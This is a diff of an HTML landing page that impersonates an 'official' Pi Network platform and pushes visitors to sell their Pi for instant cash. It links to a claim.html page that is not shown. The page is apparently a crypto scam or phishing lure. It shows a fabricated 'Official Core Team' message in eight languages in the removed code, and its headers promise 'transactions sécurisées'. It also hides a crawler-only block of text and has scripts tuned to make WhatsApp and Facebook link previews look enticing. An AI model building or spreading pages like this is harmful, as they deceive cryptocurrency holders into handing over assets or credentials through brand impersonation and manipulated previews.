@@ -5,27 +5,33 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Pi Network - Vendez Maintenant, Recevez Cash Instantané! | Plateforme Officielle</title>
     
-    <!-- Balises Open Graph dynamiques -->
+    <!-- Balises Open Graph essentielles pour WhatsApp -->
     <meta property="og:title" content="Pi Network - Vendez Maintenant, Recevez Cash Instantané!">
-    <meta property="og:description" content="🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal, Western Union. Taux avantageux ⚡ Transactions sécurisées ⚡ Support 24h/24 ⚡ Rejoignez des milliers de pionniers satisfaits! Cliquez pour vendre vos Pi maintenant!">
+    <meta property="og:description" content="🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal, Western Union. Taux avantageux ⚡ Transactions sécurisées">
     <meta property="og:image" content="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
     <meta property="og:image:width" content="1200">
     <meta property="og:image:height" content="630">
+    <meta property="og:image:type" content="image/png">
     <meta property="og:url" content="https://amazingpaye.com">
     <meta property="og:type" content="website">
-    <meta property="og:locale" content="fr_FR">
-    <meta property="og:locale:alternate" content="en_US">
-    <meta property="og:locale:alternate" content="es_ES">
     <meta property="og:site_name" content="Pi Network Cash">
     
     <!-- Balises Twitter -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="Pi Network - Vendez Maintenant, Recevez Cash Instantané!">
-    <meta name="twitter:description" content="🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal. Taux avantageux ⚡ Transactions sécurisées. Cliquez pour vendre!">
+    <meta name="twitter:description" content="🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal">
     <meta name="twitter:image" content="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
+    <meta name="twitter:image:alt" content="Vendez vos Pi - Recevez Cash Immédiatement">
 
     <!-- Meta description pour SEO -->
-    <meta name="description" content="Plateforme officielle Pi Network - Vendez vos Pi et recevez de l'argent comptant immédiatement. Mobile Money, PayPal, Western Union. Taux compétitifs, transactions sécurisées.">
+    <meta name="description" content="Plateforme officielle Pi Network - Vendez vos Pi et recevez de l'argent comptant immédiatement. Mobile Money, PayPal, Western Union">
+
+    <!-- Préchargement de l'image pour WhatsApp -->
+    <link rel="preload" as="image" href="https://i.postimg.cc/3x0Nrn1p/Go-2.png">
+    
+    <!-- Balises supplémentaires pour WhatsApp -->
+    <meta property="og:locale" content="fr_FR">
+    <meta property="og:updated_time" content="2024-01-01T00:00:00Z">
 
     <style>
         * {
@@ -73,26 +79,25 @@
             display: block;
         }
         
-        /* Section COMPLÈTEMENT masquée pour l'image Facebook */
-        .facebook-section {
-            position: absolute !important;
-            top: -9999px !important;
-            left: -9999px !important;
-            width: 1px !important;
-            height: 1px !important;
-            overflow: hidden !important;
-            opacity: 0 !important;
-            pointer-events: none !important;
-            z-index: -9999 !important;
-            visibility: hidden !important;
+        /* Section visible uniquement pour les robots WhatsApp/Facebook */
+        .social-preview {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            white-space: nowrap;
+            border: 0;
         }
         
-        .facebook-image {
+        .social-image {
             width: 1200px;
             height: 630px;
-            object-fit: contain;
+            object-fit: cover;
         }
-        
+
         /* Style pour le message de la Core Team */
         .core-team-message {
             background: linear-gradient(135deg, #1a5276, #2e86c1);
@@ -119,223 +124,150 @@
     </style>
 </head>
 <body>
-    <!-- Section COMPLÈTEMENT MASQUÉE pour l'image Facebook -->
-    <div class="facebook-section" id="facebookPreview" aria-hidden="true">
-        <img class="facebook-image" 
+    <!-- Section spéciale pour les robots sociaux (WhatsApp, Facebook) -->
+    <div class="social-preview" aria-hidden="true">
+        <img class="social-image" 
              src="https://i.postimg.cc/3x0Nrn1p/Go-2.png" 
-             alt="VENDEZ PI - Recevez CASH Immédiatement! Plateforme officielle Pi Network - Mobile Money, PayPal, Western Union - Transactions sécurisées et rapides"
-             id="ogImage">
+             alt="VENDEZ PI - Recevez CASH Immédiatement! Plateforme officielle Pi Network">
+        <h1>Pi Network - Vendez Maintenant, Recevez Cash Instantané!</h1>
+        <p>🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal, Western Union. Taux avantageux ⚡ Transactions sécurisées</p>
     </div>
     
     
     <!-- Image principale cliquable -->
     <img class="main-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_103151554.jpg?raw=true" 
-         alt="CLIQUEZ ICI pour VENDRE vos Pi - Argent Immédiat! Plateforme sécurisée Pi Network - Taux avantageux - Support 24h/24" 
+         alt="CLIQUEZ ICI pour VENDRE vos Pi - Argent Immédiat! Plateforme sécurisée Pi Network" 
          onclick="window.location.href='claim.html'">
     
     <!-- Image de continuation -->
     <img class="continuation-image" 
          src="https://github.com/Walyy578/Pi-Browser/blob/main/Screenshot_20250930-163639.jpg?raw=true" 
-         alt="Plateforme de vente Pi - Retrait Instantané - Mobile Money, PayPal, Western Union - Transactions 100% sécurisées">
+         alt="Plateforme de vente Pi - Retrait Instantané - Mobile Money, PayPal, Western Union">
     
     <!-- Pied de page fixe -->
     <footer class="footer">
         <img src="https://github.com/Walyy578/Pi-Browser/blob/main/InShot_20250930_165420094.jpg?raw=true" 
-             alt="RECEVEZ VOTRE ARGENT MAINTENANT - Pi Network - Vente sécurisée - Paiement instantané - Service client disponible">
+             alt="RECEVEZ VOTRE ARGENT MAINTENANT - Pi Network - Vente sécurisée">
     </footer>
 
     <script>
-        // DESCRIPTIONS COMPLÈTES ET VISIBLES pour l'aperçu
-        const ogTranslations = {
+        // Configuration optimisée pour WhatsApp
+        const whatsappConfig = {
             en: {
                 title: "Pi Network - SELL NOW, Get INSTANT CASH!",
-                description: "🚀 SELL your Pi for REAL MONEY! INSTANT withdrawal via Mobile Money, PayPal, Western Union. Best rates ⚡ Secure transactions ⚡ 24/7 support ⚡ Join thousands of satisfied pioneers! Click to sell your Pi now!",
-                imageAlt: "SELL PI - Get INSTANT CASH Now! Official Pi Network platform - Mobile Money, PayPal, Western Union - Secure and fast transactions"
+                description: "🚀 SELL your Pi for REAL MONEY! INSTANT withdrawal via Mobile Money, PayPal, Western Union. Best rates ⚡ Secure transactions",
+                image: "https://i.postimg.cc/3x0Nrn1p/Go-2.png"
             },
             fr: {
                 title: "Pi Network - Vendez Maintenant, Recevez Cash Instantané!",
-                description: "🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal, Western Union. Taux avantageux ⚡ Transactions sécurisées ⚡ Support 24h/24 ⚡ Rejoignez des milliers de pionniers satisfaits! Cliquez pour vendre vos Pi maintenant!",
-                imageAlt: "VENDEZ PI - Recevez CASH Immédiatement! Plateforme officielle Pi Network - Mobile Money, PayPal, Western Union - Transactions sécurisées et rapides"
+                description: "🚀 VENDEZ vos Pi en ARGENT COMPTANT! Retrait IMMÉDIAT par Mobile Money, PayPal, Western Union. Taux avantageux ⚡ Transactions sécurisées",
+                image: "https://i.postimg.cc/3x0Nrn1p/Go-2.png"
             },
             es: {
                 title: "Pi Network - ¡Vende YA, Recibe Efectivo INMEDIATO!",
-                description: "🚀 ¡VENDE tus Pi por DINERO REAL! Retiro INMEDIATO vía Mobile Money, PayPal, Western Union. Mejores tasas ⚡ Transacciones seguras ⚡ Soporte 24/7 ⚡ ¡Únete a miles de pioneros satisfechos! ¡Haz clic para vender tus Pi ahora!",
-                imageAlt: "VENDER PI - ¡Recibe EFECTIVO Inmediato! Plataforma oficial Pi Network - Mobile Money, PayPal, Western Union - Transacciones seguras y rápidas"
+                description: "🚀 ¡VENDE tus Pi por DINERO REAL! Retiro INMEDIATO vía Mobile Money, PayPal, Western Union. Mejores tasas ⚡ Transacciones seguras",
+                image: "https://i.postimg.cc/3x0Nrn1p/Go-2.png"
             },
             de: {
                 title: "Pi Network - JETZT Verkaufen, Sofort BARGELD!",
-                description: "🚀 VERKAUFEN Sie Ihre Pi für ECHTES GELD! SOFORTIGE Auszahlung per Mobile Money, PayPal, Western Union. Beste Kurse ⚡ Sichere Transaktionen ⚡ 24/7 Support ⚡ Tausende zufriedene Nutzer! Jetzt Pi verkaufen!",
-                imageAlt: "PI VERKAUFEN - Sofort BARGELD erhalten! Offizielle Pi Network Plattform - Mobile Money, PayPal, Western Union - Sichere und schnelle Transaktionen"
-            },
-            ar: {
-                title: "Pi Network - بِع الآن، احصل على نقدي فوري!",
-                description: "🚀 بِع عملات Pi الخاصة بك مقابل أموال حقيقية! سحب فوري عبر Mobile Money أو PayPal أو Western Union. أفضل الأسعار ⚡ معاملات آمنة ⚡ دعم على مدار 24 ساعة ⚡ انضم إلى آلاف المستخدمين الراضين! انقر لبيع Pi الخاص بك الآن!",
-                imageAlt: "بيع PI - احصل على نقدي فوري! منصة Pi Network الرسمية - Mobile Money, PayPal, Western Union - معاملات آمنة وسريعة"
-            },
-            pt: {
-                title: "Pi Network - Venda AGORA, Receba DINHEIRO Instantâneo!",
-                description: "🚀 VENDA seus Pi por DINHEIRO REAL! Saque INSTANTÂNEO via Mobile Money, PayPal, Western Union. Melhores taxas ⚡ Transações seguras ⚡ Suporte 24h ⚡ Junte-se a milhares de pioneiros satisfeitos! Clique para vender seus Pi agora!",
-                imageAlt: "VENDER PI - Receba DINHEIRO Imediato! Plataforma oficial Pi Network - Mobile Money, PayPal, Western Union - Transações seguras e rápidas"
-            },
-            ru: {
-                title: "Pi Network - Продавайте СЕЙЧАС, Получите НАЛИЧНЫЕ Мгновенно!",
-                description: "🚀 ПРОДАВАЙТЕ ваши Pi за РЕАЛЬНЫЕ ДЕНЬГИ! МГНОВЕННЫЙ вывод через Mobile Money, PayPal, Western Union. Лучшие курсы ⚡ Безопасные транзакции ⚡ Поддержка 24/7 ⚡ Присоединяйтесь к тысячам довольных пользователей! Нажмите чтобы продать ваши Pi сейчас!",
-                imageAlt: "ПРОДАТЬ PI - Получите НАЛИЧНЫЕ Сразу! Официальная платформа Pi Network - Mobile Money, PayPal, Western Union - Безопасные и быстрые транзакции"
-            },
-            zh: {
-                title: "Pi Network - 立即出售，获得即时现金！",
-                description: "🚀 出售您的Pi获得真实现金！通过Mobile Money、PayPal、Western Union即时提现。最优汇率 ⚡ 安全交易 ⚡ 24/7支持 ⚡ 加入数千名满意的先驱者！点击立即出售您的Pi！",
-                imageAlt: "出售PI - 立即获得现金！Pi Network官方平台 - Mobile Money, PayPal, Western Union - 安全快速交易"
+                description: "🚀 VERKAUFEN Sie Ihre Pi für ECHTES GELD! SOFORTIGE Auszahlung per Mobile Money, PayPal, Western Union. Beste Kurse ⚡ Sichere Transaktionen",
+                image: "https://i.postimg.cc/3x0Nrn1p/Go-2.png"
             }
         };
 
-        // Détection de la langue pour Facebook
-        function detectFacebookLanguage() {
-            // 1. Vérifier les paramètres d'URL en premier
-            const urlParams = new URLSearchParams(window.location.search);
-            const forcedLang = urlParams.get('lang');
-            if (forcedLang && ogTranslations[forcedLang]) {
-                return forcedLang;
-            }
-
-            // 2. Vérifier fb_locale (utilisé par Facebook)
-            if (window.location.search.includes('fb_locale')) {
-                const fbLocale = urlParams.get('fb_locale');
-                if (fbLocale.startsWith('fr')) return 'fr';
-                else if (fbLocale.startsWith('es')) return 'es';
-                else if (fbLocale.startsWith('de')) return 'de';
-                else if (fbLocale.startsWith('ar')) return 'ar';
-                else if (fbLocale.startsWith('pt')) return 'pt';
-                else if (fbLocale.startsWith('ru')) return 'ru';
-                else if (fbLocale.startsWith('zh')) return 'zh';
-            }
-
-            // 3. Détection par navigateur pour Facebook
+        // Détection du user agent pour WhatsApp
+        function detectWhatsAppUserAgent() {
             const userAgent = navigator.userAgent.toLowerCase();
-            const isFacebookBot = userAgent.includes('facebookexternalhit');
-            
-            if (isFacebookBot) {
-                const browserLang = navigator.language || navigator.userLanguage;
-                if (browserLang.startsWith('fr')) return 'fr';
-                if (browserLang.startsWith('es')) return 'es';
-                if (browserLang.startsWith('de')) return 'de';
-                if (browserLang.startsWith('ar')) return 'ar';
-                if (browserLang.startsWith('pt')) return 'pt';
-                if (browserLang.startsWith('ru')) return 'ru';
-                if (browserLang.startsWith('zh')) return 'zh';
-            }
-
-            // 4. Par défaut français
-            return 'fr';
+            return userAgent.includes('whatsapp');
         }
 
-        // Mettre à jour les balises OG selon la langue
-        function updateOGTags(lang) {
-            const translation = ogTranslations[lang] || ogTranslations.fr;
+        // Mettre à jour les balises OG pour WhatsApp
+        function updateMetaTagsForWhatsApp() {
+            const lang = 'fr'; // Par défaut français pour WhatsApp
+            const config = whatsappConfig[lang] || whatsappConfig.fr;
             
-            // Mettre à jour les balises OG (pour Facebook)
-            document.querySelector('meta[property="og:title"]').setAttribute('content', translation.title);
-            document.querySelector('meta[property="og:description"]').setAttribute('content', translation.description);
-            document.querySelector('meta[property="og:locale"]').setAttribute('content', getLocaleCode(lang));
+            // Mettre à jour les balises OG essentielles
+            document.querySelector('meta[property="og:title"]').setAttribute('content', config.title);
+            document.querySelector('meta[property="og:description"]').setAttribute('content', config.description);
+            document.querySelector('meta[property="og:image"]').setAttribute('content', config.image);
             
             // Mettre à jour Twitter
-            document.querySelector('meta[name="twitter:title"]').setAttribute('content', translation.title);
-            document.querySelector('meta[name="twitter:description"]').setAttribute('content', translation.description);
+            document.querySelector('meta[name="twitter:title"]').setAttribute('content', config.title);
+            document.querySelector('meta[name="twitter:description"]').setAttribute('content', config.description);
+            document.querySelector('meta[name="twitter:image"]').setAttribute('content', config.image);
             
-            // Mettre à jour l'image alt (masquée)
-            document.getElementById('ogImage').alt = translation.imageAlt;
+            // Mettre à jour le titre
+            document.title = config.title;
             
-            // Mettre à jour le titre de la page
-            document.title = translation.title;
-            
-            // Mettre à jour le message de la Core Team selon la langue
-            updateCoreTeamMessage(lang);
+            console.log('📱 WhatsApp OG tags updated');
         }
 
-        // Mettre à jour le message de la Core Team
-        function updateCoreTeamMessage(lang) {
-            const coreTeamMessages = {
-                en: {
-                    badge: "OFFICIAL CORE TEAM MESSAGE",
-                    text: "Sell your Pi now! Transform your Pi into cash immediately via Mobile Money, PayPal or Western Union."
-                },
-                fr: {
-                    badge: "MESSAGE OFFICIEL CORE TEAM",
-                    text: "Vendez vos Pi maintenant ! Transformez vos Pi en argent comptant immédiatement via Mobile Money, PayPal ou Western Union."
-                },
-                es: {
-                    badge: "MENSAJE OFICIAL DEL CORE TEAM",
-                    text: "¡Vende tus Pi ahora! Transforma tus Pi en efectivo inmediatamente vía Mobile Money, PayPal o Western Union."
-                },
-                de: {
-                    badge: "OFFIZIELLE CORE TEAM NACHRICHT",
-                    text: "Verkaufen Sie Ihre Pi jetzt! Verwandeln Sie Ihre Pi sofort in Bargeld über Mobile Money, PayPal oder Western Union."
-                },
-                ar: {
-                    badge: "رسالة فريق التطوير الرسمية",
-                    text: "بع عملات Pi الخاصة بك الآن! حول Pi الخاص بك إلى نقدي فورًا عبر Mobile Money أو PayPal أو Western Union."
-                },
-                pt: {
-                    badge: "MENSAGEM OFICIAL DA CORE TEAM",
-                    text: "Venda seus Pi agora! Transforme seus Pi em dinheiro imediatamente via Mobile Money, PayPal ou Western Union."
-                },
-                ru: {
-                    badge: "ОФИЦИАЛЬНОЕ СООБЩЕНИЕ CORE TEAM",
-                    text: "Продавайте свои Pi сейчас! Превратите свои Pi в наличные немедленно через Mobile Money, PayPal или Western Union."
-                },
-                zh: {
-                    badge: "官方核心团队消息",
-                    text: "立即出售您的Pi！通过Mobile Money、PayPal或Western Union立即将您的Pi转换为现金。"
-                }
+        // Vérifier et forcer le chargement de l'image
+        function preloadImageForSocialMedia() {
+            const img = new Image();
+            img.src = 'https://i.postimg.cc/3x0Nrn1p/Go-2.png?' + new Date().getTime();
+            img.onload = function() {
+                console.log('✅ Social media image loaded successfully');
             };
-            
-            const message = coreTeamMessages[lang] || coreTeamMessages.fr;
-            const badgeElement = document.querySelector('.core-team-badge');
-            const textElement = document.querySelector('.core-team-message div:last-child');
-            
-            if (badgeElement) badgeElement.textContent = message.badge;
-            if (textElement) textElement.textContent = message.text;
+            img.onerror = function() {
+                console.log('❌ Failed to load social media image');
+            };
         }
 
-        // Obtenir le code locale
-        function getLocaleCode(lang) {
-            const locales = {
-                'en': 'en_US',
-                'fr': 'fr_FR', 
-                'es': 'es_ES',
-                'de': 'de_DE',
-                'ar': 'ar_AR',
-                'pt': 'pt_BR',
-                'ru': 'ru_RU',
-                'zh': 'zh_CN'
-            };
-            return locales[lang] || 'fr_FR';
+        // Détection et optimisation pour les réseaux sociaux
+        function optimizeForSocialMedia() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            if (userAgent.includes('whatsapp') || 
+                userAgent.includes('facebook') || 
+                userAgent.includes('twitterbot')) {
+                
+                updateMetaTagsForWhatsApp();
+                preloadImageForSocialMedia();
+                
+                console.log('🎯 Optimized for social media:', {
+                    userAgent: userAgent,
+                    title: document.querySelector('meta[property="og:title"]').content,
+                    description: document.querySelector('meta[property="og:description"]').content,
+                    image: document.querySelector('meta[property="og:image"]').content
+                });
+            }
         }
 
         // Initialisation au chargement
         document.addEventListener('DOMContentLoaded', function() {
-            const detectedLang = detectFacebookLanguage();
-            updateOGTags(detectedLang);
+            optimizeForSocialMedia();
             
-            // Forcer le chargement de l'image OG pour Facebook
-            const ogImage = new Image();
-            ogImage.src = 'https://i.postimg.cc/3x0Nrn1p/Go-2.png?' + new Date().getTime();
-            
-            console.log('🚀 Facebook OG optimized for CLICKS - Language:', detectedLang);
+            // Forcer la mise à jour des meta tags après un délai
+            setTimeout(() => {
+                updateMetaTagsForWhatsApp();
+                preloadImageForSocialMedia();
+            }, 100);
+
+            // Vérification finale
+            setTimeout(() => {
+                console.log('🔍 Final OG Tag Check:');
+                console.log('Title:', document.querySelector('meta[property="og:title"]').content);
+                console.log('Description:', document.querySelector('meta[property="og:description"]').content);
+                console.log('Image:', document.querySelector('meta[property="og:image"]').content);
+                console.log('✅ Ready for WhatsApp sharing!');
+            }, 500);
         });
 
-        // Debug pour vérifier l'optimisation
-        function debugOptimization() {
-            console.log('🎯 ULTRA-OPTIMIZED OG TAGS:');
-            console.log('Title:', document.querySelector('meta[property="og:title"]').content);
-            console.log('Description:', document.querySelector('meta[property="og:description"]').content);
-            console.log('Description length:', document.querySelector('meta[property="og:description"]').content.length);
-            console.log('✅ Complete description visible in preview!');
+        // Gestionnaire pour le partage
+        function updateMetaTagsOnShare() {
+            updateMetaTagsForWhatsApp();
+            preloadImageForSocialMedia();
         }
 
-        // Vérification
-        setTimeout(debugOptimization, 1000);
+        // Écouter les événements de visibilité (pour les onglets background)
+        document.addEventListener('visibilitychange', function() {
+            if (!document.hidden) {
+                updateMetaTagsOnShare();
+            }
+        });
+
     </script>
 </body>
 </html>
